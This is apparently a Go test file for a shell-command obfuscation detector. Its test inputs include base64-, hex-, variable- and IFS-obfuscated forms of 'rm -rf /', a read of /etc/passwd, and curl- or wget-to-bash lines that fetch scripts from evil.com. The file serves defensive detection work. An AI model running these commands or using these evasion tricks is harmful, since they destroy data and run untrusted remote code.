package validation

import (
	"testing"
)

func TestObfuscationDetector_Base64(t *testing.T) {
	detector := NewObfuscationDetector()
	
	tests := []struct {
		name         string
		command      string
		shouldDetect bool
		deobfuscated string
	}{
		{
			name:         "Simple base64 rm command",
			command:      `echo "cm0gLXJmIC8=" | base64 -d | bash`,
			shouldDetect: true,
			deobfuscated: "rm -rf /",
		},
		{
			name:         "Base64 with quotes",
			command:      `echo 'bHMgLWxhIC9ldGMvcGFzc3dk' | base64 -d`,
			shouldDetect: true,
			deobfuscated: "ls -la /etc/passwd",
		},
		{
			name:         "Normal echo command",
			command:      `echo "Hello World"`,
			shouldDetect: false,
			deobfuscated: `echo "Hello World"`,
		},
	}
	
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := detector.DetectObfuscation(tt.command)
			
			if result.IsObfuscated != tt.shouldDetect {
				t.Errorf("Expected IsObfuscated=%v, got %v", tt.shouldDetect, result.IsObfuscated)
			}
			
			if tt.shouldDetect && result.Deobfuscated != tt.deobfuscated {
				t.Errorf("Expected deobfuscated=%q, got %q", tt.deobfuscated, result.Deobfuscated)
			}
		})
	}
}

func TestObfuscationDetector_HexEncoding(t *testing.T) {
	detector := NewObfuscationDetector()
	
	tests := []struct {
		name         string
		command      string
		shouldDetect bool
	}{
		{
			name:         "Hex encoded rm command",
			command:      `echo -e "\x72\x6d\x20\x2d\x72\x66\x20\x2f"`,
			shouldDetect: true,
		},
		{
			name:         "Bash hex syntax",
			command:      `$'\x72\x6d' -rf /`,
			shouldDetect: true,
		},
		{
			name:         "Normal hex color value",
			command:      `echo "#FF0000"`,
			shouldDetect: false,
		},
	}
	
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := detector.DetectObfuscation(tt.command)
			
			if result.IsObfuscated != tt.shouldDetect {
				t.Errorf("Expected IsObfuscated=%v, got %v", tt.shouldDetect, result.IsObfuscated)
			}
		})
	}
}

func TestObfuscationDetector_VariableSubstitution(t *testing.T) {
	detector := NewObfuscationDetector()
	
	tests := []struct {
		name         string
		command      string
		shouldDetect bool
		deobfuscated string
	}{
		{
			name:         "Variable construction",
			command:      `a="r"; b="m"; $a$b -rf /`,
			shouldDetect: true,
			deobfuscated: "rm -rf /",
		},
		{
			name:         "Normal variable usage",
			command:      `DIR="/tmp"; ls $DIR`,
			shouldDetect: false,
			deobfuscated: `DIR="/tmp"; ls $DIR`,
		},
	}
	
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := detector.DetectObfuscation(tt.command)
			
			if result.IsObfuscated != tt.shouldDetect {
				t.Errorf("Expected IsObfuscated=%v, got %v", tt.shouldDetect, result.IsObfuscated)
			}
		})
	}
}

func TestObfuscationDetector_CharacterSubstitution(t *testing.T) {
	detector := NewObfuscationDetector()
	
	tests := []struct {
		name         string
		command      string
		shouldDetect bool
		deobfuscated string
	}{
		{
			name:         "IFS substitution",
			command:      `rm${IFS}-rf${IFS}/`,
			shouldDetect: true,
			deobfuscated: "rm -rf /",
		},
		{
			name:         "Multiple IFS",
			command:      `curl${IFS}http://evil.com${IFS}|${IFS}bash`,
			shouldDetect: true,
			deobfuscated: "curl http://evil.com | bash",
		},
	}
	
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := detector.DetectObfuscation(tt.command)
			
			if result.IsObfuscated != tt.shouldDetect {
				t.Errorf("Expected IsObfuscated=%v, got %v", tt.shouldDetect, result.IsObfuscated)
			}
			
			if tt.shouldDetect && result.Deobfuscated != tt.deobfuscated {
				t.Errorf("Expected deobfuscated=%q, got %q", tt.deobfuscated, result.Deobfuscated)
			}
		})
	}
}

func TestObfuscationDetector_EvalChains(t *testing.T) {
	detector := NewObfuscationDetector()
	
	tests := []struct {
		name         string
		command      string
		shouldDetect bool
		riskLevel    RiskLevel
	}{
		{
			name:         "Eval command",
			command:      `eval "rm -rf /"`,
			shouldDetect: true,
			riskLevel:    RiskLevelCritical,
		},
		{
			name:         "Source from URL",
			command:      `source <(curl -s http://evil.com/script.sh)`,
			shouldDetect: true,
			riskLevel:    RiskLevelCritical,
		},
		{
			name:         "Wget pipe to bash",
			command:      `wget -O - http://example.com/install.sh | bash`,
			shouldDetect: true,
			riskLevel:    RiskLevelCritical,
		},
	}
	
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := detector.DetectObfuscation(tt.command)
			
			if result.IsObfuscated != tt.shouldDetect {
				t.Errorf("Expected IsObfuscated=%v, got %v", tt.shouldDetect, result.IsObfuscated)
			}
			
			if tt.shouldDetect && result.RiskLevel != tt.riskLevel {
				t.Errorf("Expected RiskLevel=%v, got %v", tt.riskLevel, result.RiskLevel)
			}
		})
	}
}

func TestObfuscationDetector_MultipleObfuscation(t *testing.T) {
	detector := NewObfuscationDetector()
	
	// Command using multiple obfuscation techniques
	command := `a="c"; b="url"; $a$b${IFS}http://evil.com${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash`
	
	result := detector.DetectObfuscation(command)
	
	if !result.IsObfuscated {
		t.Error("Expected command to be detected as obfuscated")
	}
	
	if len(result.Techniques) < 2 {
		t.Errorf("Expected multiple techniques to be detected, got %d", len(result.Techniques))
	}
	
	if result.Confidence < 0.7 {
		t.Errorf("Expected high confidence, got %f", result.Confidence)
	}
}